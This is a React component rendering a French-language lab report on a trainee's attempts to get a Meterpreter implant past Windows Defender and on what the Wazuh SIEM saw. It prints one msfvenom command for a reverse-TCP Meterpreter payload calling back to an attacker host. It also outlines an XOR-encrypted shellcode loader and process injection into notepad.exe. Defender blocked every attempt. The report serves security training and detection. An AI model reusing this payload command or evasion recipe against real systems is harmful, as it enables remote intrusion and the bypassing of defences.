import { ReportHeader, H2, H3, Cmd, Table } from './ReportUI'

export default function RapportEvasion() {
  return (
    <article className="text-zinc-300 leading-relaxed">
      <ReportHeader
        title="Évasion Antivirus & Détection Wazuh"
        subtitle="Chapitre 6, Module 4 — Paliers 1, 2 et 3 · MITRE T1562 (Impair Defenses)"
        meta="23 juin 2026 · Kali [KALI] → Windows Server 2022 [SERVEUR] · Wazuh 4.12.0"
      />

      <H2>1. Objectif</H2>
      <p>
        Fabriquer un implant Meterpreter et tenter de passer Windows Defender, sans jamais le désactiver
        ni tricher. Trois paliers d'évasion testés successivement, chacun observé côté SIEM. Prérequis :
        canal Defender collecté par Wazuh, règles <b>62123</b> (détection, niv.12) et <b>62124</b>
        (quarantaine, niv.3) actives.
      </p>

      <H2>2. Palier 1 — Encodeur XOR msfvenom</H2>
      <Cmd term="Kali">{`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[KALI] LPORT=4444 \\
  -e x64/xor_dynamic -i 10 -f exe -o /home/kali/evasion1_xor.exe`}</Cmd>
      <p>
        <b>Résultat :</b> Defender bloque via AMSI à l'exécution. Menace :{' '}
        <span className="font-mono text-xs">Trojan:Win32/Zusy.NCD!MTB</span>.
      </p>
      <p className="mt-1">
        <b>Leçon :</b> encoder les octets sur le disque ne suffit pas. L'AMSI intercepte le code en
        mémoire, après le déchiffrement.
      </p>

      <H2>3. Palier 2 — Shellcode chiffré XOR + loader C</H2>
      <p>
        Shellcode brut extrait (509 octets), chiffré XOR (clé 0xAB), loader C qui déchiffre en mémoire
        et exécute via <span className="font-mono text-xs">VirtualAlloc</span> +{' '}
        <span className="font-mono text-xs">CreateThread</span>, compilé avec mingw.
      </p>
      <p className="mt-1">
        <b>Résultat :</b> Defender supprime <span className="font-mono text-xs">loader2.exe</span> pendant
        le téléchargement (protection temps réel à l'écriture disque).
      </p>
      <p className="mt-1">
        <b>Leçon :</b> le XOR simple à clé fixe est connu des éditeurs, et la combinaison{' '}
        <span className="font-mono text-xs">VirtualAlloc(RWX) + CreateThread</span> est une signature
        comportementale classique.
      </p>

      <H2>4. Palier 3 — Injection de processus</H2>
      <p>
        Le loader démarre <span className="font-mono text-xs">notepad.exe</span>, alloue de la mémoire
        dans son espace (<span className="font-mono text-xs">VirtualAllocEx</span>), y écrit le shellcode
        (<span className="font-mono text-xs">WriteProcessMemory</span>) puis crée un thread distant
        (<span className="font-mono text-xs">CreateRemoteThread</span>).
      </p>
      <p className="mt-1">
        <b>Résultat :</b> bloqué à l'écriture disque, comme le palier 2. Defender surveille aussi la table
        d'imports : ces trois API ensemble = signature connue.
      </p>

      <H2>5. Vue analyste SOC — Ce que Wazuh a vu</H2>
      <Table
        head={['Évènement', 'Rule ID', 'Niveau', 'Signification']}
        rows={[
          ['Event 1116 (Defender détecte)', '62123', '12', 'Menace identifiée — priorité haute'],
          ['Event 1117 (Defender agit)', '62124', '3', 'Fichier mis en quarantaine'],
        ]}
      />
      <p className="mt-2">
        Chaque tentative a déclenché les deux règles. Le suffixe <b>!ml</b> de la menace
        (<span className="font-mono text-xs">Trojan:Script/Wacatac.B!ml</span>) indique une détection par
        <b> Machine Learning</b> — pas une signature classique. C'est pourquoi les loaders custom ont été
        bloqués malgré l'absence de signature connue.
      </p>
      <p className="mt-2">
        <b>Angle mort :</b> si un implant passait Defender, aucune alerte 62123/62124 ne tomberait. La
        détection reposerait alors sur d'autres sources : Event 4688, Event 7045, trafic réseau, Sysmon.
      </p>

      <H2>6. Conclusion</H2>
      <p>
        Contourner un Defender moderne (moteur ML) est une discipline à part entière : les techniques de
        base (encodeurs, chiffrement simple, loaders C) sont connues et détectées. Objectif SOC atteint :
        comprendre les trois couches de détection (signature disque, AMSI mémoire, heuristique ML), voir
        Wazuh détecter chaque tentative, et identifier les angles morts.
      </p>
    </article>
  )
}
